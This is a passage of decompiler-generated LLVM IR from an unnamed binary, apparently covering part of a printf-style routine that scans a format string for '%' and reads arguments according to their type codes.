  uselistorder i32 %v0_dea0, { 1, 0 }
  uselistorder i32 %v2_de84, { 2, 0, 1 }
  uselistorder i1 %v3_de64, { 1, 0 }
  uselistorder i32 %v0_de74, { 0, 2, 3, 1 }
  uselistorder i32 %v2_de48, { 1, 0 }
  uselistorder i32 %v0_de8c, { 1, 0, 2 }
  uselistorder i32 %v3_de1c, { 1, 2, 0 }
  uselistorder i32 %v0_ddcc, { 1, 0 }
  uselistorder i32 %v2_ddb0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_dd78, { 1, 2, 0, 3 }
  uselistorder i32 %v0_dd44, { 1, 2, 0, 3 }
  uselistorder i32 %v1_dc48, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_dc64, { 1, 2, 3, 0 }
  uselistorder i32 %v6_dbe4, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_db48, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_daf8.pre, { 2, 1, 0 }
  uselistorder i32 %v1_daf0, { 1, 0 }
  uselistorder i32 %v1_da98, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_da58, { 1, 0 }
  uselistorder i32 %v1_da50.lcssa, { 1, 0 }
  uselistorder i8 %v2_da3c, { 1, 2, 0 }
  uselistorder i32 %v2_da50, { 1, 2, 3, 0 }
  uselistorder i1 %v7_dc5c, { 1, 0 }
  uselistorder i1 %v7_dba8, { 1, 2, 0 }
  uselistorder i1 %v7_dda0, { 1, 0 }
  uselistorder i1 %v7_dd00, { 1, 0 }
  uselistorder i1 %v7_dbec, { 1, 0 }
  uselistorder i32 %v2_dd40, { 0, 2, 1, 3 }
  uselistorder i32 %v2_de10, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_db20, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_daf4, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_dad4, { 1, 2, 0 }
  uselistorder i32 %v4_dacc, { 1, 0 }
  uselistorder i32 %v2_d9d0, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 38, 32, 33, 1, 2, 34, 35, 39, 36, 37, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r2.global-to-local, { 17, 2, 3, 20, 21, 22, 23, 24, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 25, 26, 15, 16, 18, 19, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 11, 13, 12, 15, 14, 33, 32, 34, 35, 37, 36, 3, 38, 43, 39, 2, 40, 16, 9, 17, 8, 18, 7, 19, 44, 20, 42, 21, 22, 23, 1, 41, 24, 25, 26, 4, 10, 6, 27, 29, 28, 30, 5, 31, 0 }
  uselistorder i32 (i32, i8, i32)* @function_d8f8, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_11570, { 1, 0 }
  uselistorder label %dec_label_pc_df9c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_df94, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_df84, { 1, 0 }
  uselistorder label %dec_label_pc_df44, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_deb4, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_de60, { 1, 0 }
  uselistorder label %dec_label_pc_de44, { 0, 2, 1 }
  uselistorder label %dec_label_pc_de44thread-pre-split, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_de38, { 1, 0 }
  uselistorder label %dec_label_pc_de30, { 1, 0 }
  uselistorder label %dec_label_pc_de28, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_ddbc, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_db98, { 1, 0 }
  uselistorder label %dec_label_pc_db94, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_daec, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_da8c, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_da58, { 2, 1, 0 }
}

define i32 @function_dfbc(i32* %arg1) local_unnamed_addr {
dec_label_pc_dfbc:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_dfbc = load i32, i32* @r4, align 4
  store i32 %v3_dfbc, i32* %stack_var_-12, align 4
  %v6_dfbc = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_dfc8 = load i32, i32* @r1, align 4
  store i32 %v0_dfc8, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_dfd0 = bitcast i32* %arg1 to i8*
  %v3_dfd0 = call i32 @function_ef70(i8* %v2_dfd0, i32 0)
  %v0_dfd4 = load i32, i32* @r4, align 4
  %v1_dfd4 = add i32 %v0_dfd4, 24
  %v2_dfd4 = inttoptr i32 %v1_dfd4 to i32*
  %v3_dfd4 = load i32, i32* %v2_dfd4, align 4
  %v1_dfd8 = add i32 %v3_dfd4, -1
  store i32 %v1_dfd8, i32* %v2_dfd4, align 4
  %v0_dfe0 = load i32, i32* @r5, align 4
  %v1_dfe0 = load i32, i32* @r4, align 4
  %v2_dfe0 = inttoptr i32 %v1_dfe0 to i32*
  store i32 %v0_dfe0, i32* %v2_dfe0, align 4
  %v0_dfe4 = load i32, i32* @r4, align 4
  %v1_dfe4 = add i32 %v0_dfe4, 40
  store i32 %v1_dfe4, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_dff419 = inttoptr i32 %v1_dfe4 to i32*
  store i32 8, i32* %v2_dff419, align 4
  %v3_dff420 = load i32, i32* %r1.global-to-local, align 4
  %v4_dff421 = add i32 %v3_dff420, 4
  store i32 %v4_dff421, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_dfec.dec_label_pc_dfec_crit_edge

dec_label_pc_dfec.dec_label_pc_dfec_crit_edge:    ; preds = %dec_label_pc_dfbc, %dec_label_pc_dfec.dec_label_pc_dfec_crit_edge
  %v4_dff422 = phi i32 [ %v4_dff421, %dec_label_pc_dfbc ], [ %v4_dff4, %dec_label_pc_dfec.dec_label_pc_dfec_crit_edge ]
  %v0_dff0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_dff0 = add i32 %v0_dff0.pre, -1
  store i32 %v1_dff0, i32* %r2.global-to-local, align 4
  %v7_dff0 = icmp eq i32 %v0_dff0.pre, 1
  %v2_dff4 = inttoptr i32 %v4_dff422 to i32*
  store i32 8, i32* %v2_dff4, align 4
  %v3_dff4 = load i32, i32* %r1.global-to-local, align 4
  %v4_dff4 = add i32 %v3_dff4, 4
  store i32 %v4_dff4, i32* %r1.global-to-local, align 4
  br i1 %v7_dff0, label %dec_label_pc_dffc, label %dec_label_pc_dfec.dec_label_pc_dfec_crit_edge

dec_label_pc_dffc:                                ; preds = %dec_label_pc_dfec.dec_label_pc_dfec_crit_edge
  %v0_dffc = load i32, i32* @r5, align 4
  store i32 %v0_dffc, i32* %r2.global-to-local, align 4
  %v1_e0403 = inttoptr i32 %v0_dffc to i8*
  %v2_e0404 = load i8, i8* %v1_e0403, align 1
  %v2_e0446 = icmp eq i8 %v2_e0404, 0
  br i1 %v2_e0446, label %dec_label_pc_e04c, label %dec_label_pc_e00c

dec_label_pc_e004:                                ; preds = %dec_label_pc_e024
  %v2_e008 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e008, i32* @r4, align 4
  store i32 %v6_dfbc, i32* @r5, align 4
  ret i32 -1

dec_label_pc_e00c:                                ; preds = %dec_label_pc_dffc, %dec_label_pc_e040.backedge
  %v0_e014 = phi i32 [ %storemerge, %dec_label_pc_e040.backedge ], [ %v0_dffc, %dec_label_pc_dffc ]
  %v2_e0407 = phi i8 [ %v2_e040, %dec_label_pc_e040.backedge ], [ %v2_e0404, %dec_label_pc_dffc ]
  %v7_e00c = icmp eq i8 %v2_e0407, 37
  br i1 %v7_e00c, label %dec_label_pc_e014, label %dec_label_pc_e03c

dec_label_pc_e014:                                ; preds = %dec_label_pc_e00c
  %v1_e014 = add i32 %v0_e014, 1
  %v2_e014 = inttoptr i32 %v1_e014 to i8*
  %v3_e014 = load i8, i8* %v2_e014, align 1
  store i32 %v1_e014, i32* %r2.global-to-local, align 4
  %v7_e018 = icmp eq i8 %v3_e014, 37
  br i1 %v7_e018, label %dec_label_pc_e03c, label %dec_label_pc_e024

dec_label_pc_e024:                                ; preds = %dec_label_pc_e014
  %v0_e01c = load i32, i32* @r4, align 4
  %v2_e024 = inttoptr i32 %v0_e01c to i32*
  store i32 %v1_e014, i32* %v2_e024, align 4
  %v2_e028 = call i32 @function_e274(i32* %v2_e024)
  %v1_e02c = icmp slt i32 %v2_e028, 0
  br i1 %v1_e02c, label %dec_label_pc_e004, label %dec_label_pc_e034

dec_label_pc_e034:                                ; preds = %dec_label_pc_e024
  %v0_e034 = load i32, i32* @r4, align 4
  %v1_e034 = inttoptr i32 %v0_e034 to i32*
  %v2_e034 = load i32, i32* %v1_e034, align 4
  br label %dec_label_pc_e040.backedge

dec_label_pc_e03c:                                ; preds = %dec_label_pc_e00c, %dec_label_pc_e014
  %v0_e03c = phi i32 [ %v0_e014, %dec_label_pc_e00c ], [ %v1_e014, %dec_label_pc_e014 ]
  %v1_e03c = add i32 %v0_e03c, 1
  br label %dec_label_pc_e040.backedge

dec_label_pc_e040.backedge:                       ; preds = %dec_label_pc_e03c, %dec_label_pc_e034
  %storemerge = phi i32 [ %v1_e03c, %dec_label_pc_e03c ], [ %v2_e034, %dec_label_pc_e034 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_e040 = inttoptr i32 %storemerge to i8*
  %v2_e040 = load i8, i8* %v1_e040, align 1
  %v2_e044 = icmp eq i8 %v2_e040, 0
  br i1 %v2_e044, label %dec_label_pc_e040.dec_label_pc_e04c_crit_edge, label %dec_label_pc_e00c

dec_label_pc_e040.dec_label_pc_e04c_crit_edge:    ; preds = %dec_label_pc_e040.backedge
  %v0_e04c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_e04c

dec_label_pc_e04c:                                ; preds = %dec_label_pc_e040.dec_label_pc_e04c_crit_edge, %dec_label_pc_dffc
  %v0_e04c = phi i32 [ %v0_e04c.pre, %dec_label_pc_e040.dec_label_pc_e04c_crit_edge ], [ %v0_dffc, %dec_label_pc_dffc ]
  %v3_e040.lcssa.in = phi i8 [ %v2_e040, %dec_label_pc_e040.dec_label_pc_e04c_crit_edge ], [ %v2_e0404, %dec_label_pc_dffc ]
  %v3_e040.lcssa = zext i8 %v3_e040.lcssa.in to i32
  %v1_e04c = load i32, i32* @r4, align 4
  %v2_e04c = inttoptr i32 %v1_e04c to i32*
  store i32 %v0_e04c, i32* %v2_e04c, align 4
  %v2_e050 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e050, i32* @r4, align 4
  store i32 %v6_dfbc, i32* @r5, align 4
  ret i32 %v3_e040.lcssa

; uselistorder directives
  uselistorder i8 %v2_e040, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_dffc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_dff4, { 1, 0 }
  uselistorder i32 %v0_dff0.pre, { 1, 0 }
  uselistorder i32 %v6_dfbc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_e03c, { 1, 0 }
  uselistorder label %dec_label_pc_e00c, { 1, 0 }
  uselistorder label %dec_label_pc_dfec.dec_label_pc_dfec_crit_edge, { 1, 0 }
}

define i32 @function_e054(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e054:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_e054 = load i32, i32* @r4, align 4
  store i32 %v3_e054, i32* %stack_var_-12, align 4
  %v1_e058 = add i32 %arg1, 24
  %v2_e058 = inttoptr i32 %v1_e058 to i32*
  %v3_e058 = load i32, i32* %v2_e058, align 4
  store i32 %v3_e058, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_e068 = add i32 %arg1, 76
  %v3_e068 = inttoptr i32 %v2_e068 to i32*
  store i32 %arg2, i32* %v3_e068, align 4
  %v7_e06c = icmp sgt i32 %v3_e058, 0
  br i1 %v7_e06c, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_e054
  %v10_e06c = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_e06c, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %dec_label_pc_e054
  %v0_e070 = load i32, i32* %r3.global-to-local, align 4
  %v2_e070 = add i32 %arg1, 8
  %v3_e070 = inttoptr i32 %v2_e070 to i32*
  store i32 %v0_e070, i32* %v3_e070, align 4
  %v0_e074 = load i32, i32* %r5.global-to-local, align 4
  %v2_e074 = add i32 %arg1, 28
  %v3_e074 = inttoptr i32 %v2_e074 to i32*
  store i32 %v0_e074, i32* %v3_e074, align 4
  %v0_e078 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e078, i32* %v2_e058, align 4
  %v0_e07c = load i32, i32* %r3.global-to-local, align 4
  %v2_e07c = add i32 %arg1, 4
  %v3_e07c = inttoptr i32 %v2_e07c to i32*
  store i32 %v0_e07c, i32* %v3_e07c, align 4
  %v0_e080 = call i32 @function_e08c()
  %v0_e084 = load i32, i32* %r5.global-to-local, align 4
  %v1_e084 = load i32, i32* @r4, align 4
  %v2_e084 = add i32 %v1_e084, 24
  %v3_e084 = inttoptr i32 %v2_e084 to i32*
  store i32 %v0_e084, i32* %v3_e084, align 4
  %v2_e088 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e088, i32* @r4, align 4
  ret i32 %v0_e080

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_e08c, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 2, 3, 1, 0, 6, 7 }
}

define i32 @function_e08c() local_unnamed_addr {
dec_label_pc_e08c:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_e08c = load i32, i32* @r0, align 4
  %v1_e08c = add i32 %v0_e08c, 24
  %v2_e08c = inttoptr i32 %v1_e08c to i32*
  %v3_e08c = load i32, i32* %v2_e08c, align 4
  store i32 %v3_e08c, i32* %r1.global-to-local, align 4
  %v2_e090 = icmp eq i32 %v3_e08c, 0
  %v3_e094 = load i32, i32* @r4, align 4
  store i32 %v3_e094, i32* %stack_var_-8, align 4
  %v1_e098 = add i32 %v0_e08c, 80
  store i32 %v1_e098, i32* %ip.global-to-local, align 4
  %v1_e09c = add i32 %v0_e08c, 8
  %v2_e09c = inttoptr i32 %v1_e09c to i32*
  %v3_e09c = load i32, i32* %v2_e09c, align 4
  store i32 %v3_e09c, i32* %r3.global-to-local, align 4
  %v6_e0a4 = icmp eq i32 %v3_e09c, -2147483648
  br i1 %v2_e090, label %dec_label_pc_e0a4, label %dec_label_pc_e1c8

dec_label_pc_e0a4:                                ; preds = %dec_label_pc_e08c
  br i1 %v6_e0a4, label %dec_label_pc_e0ac, label %dec_label_pc_e0c4

dec_label_pc_e0ac:                                ; preds = %dec_label_pc_e0a4
  %v1_e0ac = add i32 %v0_e08c, 76
  %v2_e0ac = inttoptr i32 %v1_e0ac to i32*
  %v3_e0ac = load i32, i32* %v2_e0ac, align 4
  store i32 %v3_e0ac, i32* %r3.global-to-local, align 4
  %v1_e0b0 = inttoptr i32 %v3_e0ac to i32*
  %v2_e0b0 = load i32, i32* %v1_e0b0, align 4
  store i32 %v2_e0b0, i32* %r2.global-to-local, align 4
  %v1_e0b4 = add i32 %v3_e0ac, 4
  store i32 %v1_e0b4, i32* %r3.global-to-local, align 4
  store i32 %v1_e0b4, i32* %v2_e0ac, align 4
  %v0_e0bc = load i32, i32* %r2.global-to-local, align 4
  %v1_e0bc = load i32, i32* @r0, align 4
  %v2_e0bc = add i32 %v1_e0bc, 8
  %v3_e0bc = inttoptr i32 %v2_e0bc to i32*
  store i32 %v0_e0bc, i32* %v3_e0bc, align 4
  %v0_e0c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0c0 = load i32, i32* @r0, align 4
  %v2_e0c0 = add i32 %v1_e0c0, 80
  %v3_e0c0 = inttoptr i32 %v2_e0c0 to i32*
  store i32 %v0_e0c0, i32* %v3_e0c0, align 4
  %v0_e0c4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e0c4

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_e0a4, %dec_label_pc_e0ac
  %v1_e0dc = phi i32 [ %v0_e08c, %dec_label_pc_e0a4 ], [ %v0_e0c4.pre, %dec_label_pc_e0ac ]
  %v1_e0c4 = add i32 %v1_e0dc, 4
  %v2_e0c4 = inttoptr i32 %v1_e0c4 to i32*
  %v3_e0c4 = load i32, i32* %v2_e0c4, align 4
  store i32 %v3_e0c4, i32* %r3.global-to-local, align 4
  %v6_e0c8 = icmp eq i32 %v3_e0c4, -2147483648
  br i1 %v6_e0c8, label %dec_label_pc_e0d0, label %dec_label_pc_e0e8

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e0c4
  %v1_e0d0 = add i32 %v1_e0dc, 76
  %v2_e0d0 = inttoptr i32 %v1_e0d0 to i32*
  %v3_e0d0 = load i32, i32* %v2_e0d0, align 4
  store i32 %v3_e0d0, i32* %r3.global-to-local, align 4
  %v1_e0d4 = inttoptr i32 %v3_e0d0 to i32*
  %v2_e0d4 = load i32, i32* %v1_e0d4, align 4
  store i32 %v2_e0d4, i32* %r2.global-to-local, align 4
  %v1_e0d8 = add i32 %v3_e0d0, 4
  store i32 %v1_e0d8, i32* %r3.global-to-local, align 4
  store i32 %v1_e0d8, i32* %v2_e0d0, align 4
  %v0_e0e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0e0 = load i32, i32* @r0, align 4
  %v2_e0e0 = add i32 %v1_e0e0, 4
  %v3_e0e0 = inttoptr i32 %v2_e0e0 to i32*
  store i32 %v0_e0e0, i32* %v3_e0e0, align 4
  %v0_e0e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0e4 = load i32, i32* @r0, align 4
  %v2_e0e4 = add i32 %v1_e0e4, 80
  %v3_e0e4 = inttoptr i32 %v2_e0e4 to i32*
  store i32 %v0_e0e4, i32* %v3_e0e4, align 4
  %v0_e1b818.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e0e8

dec_label_pc_e0e8:                                ; preds = %dec_label_pc_e0c4, %dec_label_pc_e0d0
  %v0_e1b818 = phi i32 [ %v1_e0dc, %dec_label_pc_e0c4 ], [ %v0_e1b818.pre, %dec_label_pc_e0d0 ]
  %v0_e0e8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_e0e8, i32* @lr, align 4
  %v1_e1b819 = add i32 %v0_e1b818, 28
  %v2_e1b820 = inttoptr i32 %v1_e1b819 to i32*
  %v3_e1b821 = load i32, i32* %v2_e1b820, align 4
  store i32 %v3_e1b821, i32* %r3.global-to-local, align 4
  %v5_e1c023 = icmp slt i32 %v0_e0e8, %v3_e1b821
  br i1 %v5_e1c023, label %dec_label_pc_e0f0, label %dec_label_pc_e1c4.loopexit

dec_label_pc_e0f0:                                ; preds = %dec_label_pc_e0e8, %dec_label_pc_e1b4
  %v0_e1b825 = phi i32 [ %v0_e1b8, %dec_label_pc_e1b4 ], [ %v0_e1b818, %dec_label_pc_e0e8 ]
  %v1_e0f024 = phi i32 [ %v1_e1b4, %dec_label_pc_e1b4 ], [ %v0_e0e8, %dec_label_pc_e0e8 ]
  %v4_e0f0 = mul i32 %v1_e0f024, 4
  %v5_e0f0 = add i32 %v0_e1b825, %v4_e0f0
  store i32 %v5_e0f0, i32* %r3.global-to-local, align 4
  %v1_e0f4 = add i32 %v5_e0f0, 40
  %v2_e0f4 = inttoptr i32 %v1_e0f4 to i32*
  %v3_e0f4 = load i32, i32* %v2_e0f4, align 4
  store i32 %v3_e0f4, i32* %r2.global-to-local, align 4
  %v7_e0f8 = icmp eq i32 %v3_e0f4, 8
  br i1 %v7_e0f8, label %dec_label_pc_e1b4, label %dec_label_pc_e100

dec_label_pc_e100:                                ; preds = %dec_label_pc_e0f0
  %v1_e100 = add i32 %v0_e1b825, 76
  %v2_e100 = inttoptr i32 %v1_e100 to i32*
  %v3_e100 = load i32, i32* %v2_e100, align 4
  store i32 %v3_e100, i32* %r1.global-to-local, align 4
  %v8_e104 = icmp sgt i32 %v3_e0f4, 8
  br i1 %v8_e104, label %dec_label_pc_e128, label %dec_label_pc_e108

dec_label_pc_e108:                                ; preds = %dec_label_pc_e100
  %v7_e108 = icmp eq i32 %v3_e0f4, 2
  br i1 %v7_e108, label %dec_label_pc_e174, label %dec_label_pc_e110

dec_label_pc_e110:                                ; preds = %dec_label_pc_e108
  %v8_e110 = icmp sgt i32 %v3_e0f4, 2
  br i1 %v8_e110, label %dec_label_pc_e120, label %dec_label_pc_e114

dec_label_pc_e114:                                ; preds = %dec_label_pc_e110
  %v1_e114 = icmp slt i32 %v3_e0f4, 0
  br i1 %v1_e114, label %dec_label_pc_e1a0, label %dec_label_pc_e174

dec_label_pc_e120:                                ; preds = %dec_label_pc_e110
  %v7_e120 = icmp eq i32 %v3_e0f4, 7
  br i1 %v7_e120, label %dec_label_pc_e188, label %dec_label_pc_e1a0

dec_label_pc_e128:                                ; preds = %dec_label_pc_e100
  %v7_e128 = icmp eq i32 %v3_e0f4, 1024
  br i1 %v7_e128, label %dec_label_pc_e174, label %dec_label_pc_e130

dec_label_pc_e130:                                ; preds = %dec_label_pc_e128
  %v8_e130 = icmp sgt i32 %v3_e0f4, 1024
  br i1 %v8_e130, label %dec_label_pc_e148, label %dec_label_pc_e134

dec_label_pc_e134:                                ; preds = %dec_label_pc_e130
  switch i32 %v3_e0f4, label %dec_label_pc_e1a0 [
    i32 256, label %dec_label_pc_e174
    i32 512, label %dec_label_pc_e174
  ]

dec_label_pc_e148:                                ; preds = %dec_label_pc_e130
  %v7_e148 = icmp eq i32 %v3_e0f4, 2048
  br i1 %v7_e148, label %dec_label_pc_e160, label %dec_label_pc_e158

dec_label_pc_e158:                                ; preds = %dec_label_pc_e148
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_e154 = icmp eq i32 %v3_e0f4, 2055
  br i1 %v9_e154, label %dec_label_pc_e188, label %dec_label_pc_e1a0

dec_label_pc_e160:                                ; preds = %dec_label_pc_e148
  %v1_e160 = add i32 %v3_e100, 8
  store i32 %v1_e160, i32* %r3.global-to-local, align 4
  store i32 %v1_e160, i32* %v2_e100, align 4
  %v0_e168 = load i32, i32* %r1.global-to-local, align 4
  %v1_e168 = inttoptr i32 %v0_e168 to i32*
  %v2_e168 = load i32, i32* %v1_e168, align 4
  store i32 %v2_e168, i32* %r3.global-to-local, align 4
  %v3_e168 = add i32 %v0_e168, 4
  %v4_e168 = inttoptr i32 %v3_e168 to i32*
  %v5_e168 = load i32, i32* %v4_e168, align 4
  store i32 %v5_e168, i32* %r4.global-to-local, align 4
  %v0_e16c = load i32, i32* %ip.global-to-local, align 4
  %v1_e16c = inttoptr i32 %v0_e16c to i32*
  store i32 %v2_e168, i32* %v1_e16c, align 4
  %v3_e16c = add i32 %v0_e16c, 4
  %v4_e16c = inttoptr i32 %v3_e16c to i32*
  %v5_e16c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_e16c, i32* %v4_e16c, align 4
  br label %dec_label_pc_e1b0

dec_label_pc_e174:                                ; preds = %dec_label_pc_e134, %dec_label_pc_e134, %dec_label_pc_e114, %dec_label_pc_e128, %dec_label_pc_e108
  %v1_e174 = inttoptr i32 %v3_e100 to i32*
  %v2_e174 = load i32, i32* %v1_e174, align 4
  store i32 %v2_e174, i32* %r2.global-to-local, align 4
  %v1_e178 = add i32 %v3_e100, 4
  store i32 %v1_e178, i32* %r3.global-to-local, align 4
  store i32 %v1_e178, i32* %v2_e100, align 4
  %v0_e180 = load i32, i32* %r2.global-to-local, align 4
  %v1_e180 = load i32, i32* %ip.global-to-local, align 4
  %v2_e180 = inttoptr i32 %v1_e180 to i32*
  store i32 %v0_e180, i32* %v2_e180, align 4
  br label %dec_label_pc_e1b0

dec_label_pc_e188:                                ; preds = %dec_label_pc_e120, %dec_label_pc_e158
  %v3_e188 = load i32, i32* %v2_e100, align 4
  store i32 %v3_e188, i32* %r3.global-to-local, align 4
  %v1_e18c = inttoptr i32 %v3_e188 to i32*
  %v2_e18c = load i32, i32* %v1_e18c, align 4
  store i32 %v2_e18c, i32* %r1.global-to-local, align 4
  %v3_e18c = add i32 %v3_e188, 4
  %v4_e18c = inttoptr i32 %v3_e18c to i32*
  %v5_e18c = load i32, i32* %v4_e18c, align 4
  store i32 %v5_e18c, i32* %r2.global-to-local, align 4
  %v1_e190 = add i32 %v3_e188, 8
  store i32 %v1_e190, i32* %r3.global-to-local, align 4
  store i32 %v1_e190, i32* %v2_e100, align 4
  %v0_e198 = load i32, i32* %ip.global-to-local, align 4
  %v1_e198 = inttoptr i32 %v0_e198 to i32*
  %v2_e198 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_e198, i32* %v1_e198, align 4
  %v3_e198 = add i32 %v0_e198, 4
  %v4_e198 = inttoptr i32 %v3_e198 to i32*
  %v5_e198 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_e198, i32* %v4_e198, align 4
  br label %dec_label_pc_e1b0

dec_label_pc_e1a0:                                ; preds = %dec_label_pc_e134, %dec_label_pc_e120, %dec_label_pc_e114, %dec_label_pc_e158
  %v1_e1a0 = add i32 %v3_e100, 4
  store i32 %v1_e1a0, i32* %r3.global-to-local, align 4
  store i32 %v1_e1a0, i32* %v2_e100, align 4
  %v0_e1a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_e1a8 = inttoptr i32 %v0_e1a8 to i32*
  %v2_e1a8 = load i32, i32* %v1_e1a8, align 4
  store i32 %v2_e1a8, i32* %r3.global-to-local, align 4
  %v1_e1ac = load i32, i32* %ip.global-to-local, align 4
  %v2_e1ac = inttoptr i32 %v1_e1ac to i32*
  store i32 %v2_e1a8, i32* %v2_e1ac, align 4
  br label %dec_label_pc_e1b0

dec_label_pc_e1b0:                                ; preds = %dec_label_pc_e188, %dec_label_pc_e174, %dec_label_pc_e160, %dec_label_pc_e1a0
  %v0_e1b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_e1b0 = add i32 %v0_e1b0, 8
  store i32 %v1_e1b0, i32* %ip.global-to-local, align 4
  %v0_e1b4.pre = load i32, i32* @lr, align 4
  %v0_e1b8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e1b4

dec_label_pc_e1b4:                                ; preds = %dec_label_pc_e0f0, %dec_label_pc_e1b0
  %v0_e1b8 = phi i32 [ %v0_e1b825, %dec_label_pc_e0f0 ], [ %v0_e1b8.pre, %dec_label_pc_e1b0 ]
  %v0_e1b4 = phi i32 [ %v1_e0f024, %dec_label_pc_e0f0 ], [ %v0_e1b4.pre, %dec_label_pc_e1b0 ]
  %v1_e1b4 = add i32 %v0_e1b4, 1
  store i32 %v1_e1b4, i32* @lr, align 4
  %v1_e1b8 = add i32 %v0_e1b8, 28
  %v2_e1b8 = inttoptr i32 %v1_e1b8 to i32*
  %v3_e1b8 = load i32, i32* %v2_e1b8, align 4
  store i32 %v3_e1b8, i32* %r3.global-to-local, align 4
  %v5_e1c0 = icmp slt i32 %v1_e1b4, %v3_e1b8
  br i1 %v5_e1c0, label %dec_label_pc_e0f0, label %dec_label_pc_e1b8.dec_label_pc_e1c4.loopexit_crit_edge

dec_label_pc_e1c8:                                ; preds = %dec_label_pc_e08c
  br i1 %v6_e0a4, label %bb, label %.thread2

